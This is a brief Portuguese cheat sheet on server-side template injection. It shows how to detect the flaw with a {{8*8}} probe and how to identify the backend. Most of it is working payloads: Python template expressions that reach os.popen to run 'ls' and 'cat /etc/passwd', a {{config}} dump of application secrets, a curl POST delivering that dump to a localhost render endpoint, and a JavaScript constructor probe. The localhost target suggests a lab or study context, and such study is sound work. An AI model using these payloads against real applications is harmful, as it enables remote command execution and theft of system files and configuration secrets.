Para descobrir a vulnerabilidade, primeiro precisamos saber se a aplicação está vulnerável e depois precisamos saber qual é a linguagem do backend.

1) Descobrir se a aplicação é vulnerável.

Inclua em algum campo de input ou na url o código **{{8*8}}**


2) Descobir a linguagem da aplicação.

### Python

**a)** 

`{{'acacio'.upper()}}`

**b)** 

`{{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}`

**c)** 

`{{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("cat /etc/passwd").read()}}`

**d)** 

`{{config}}`

**e)** Digite o comando abaixo no terminal:
```
curl -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "input={{config}}" \
http://localhost:5000/render
```

### JavaScript

**a)** 

`{{_createElementBlock.constructor}}`

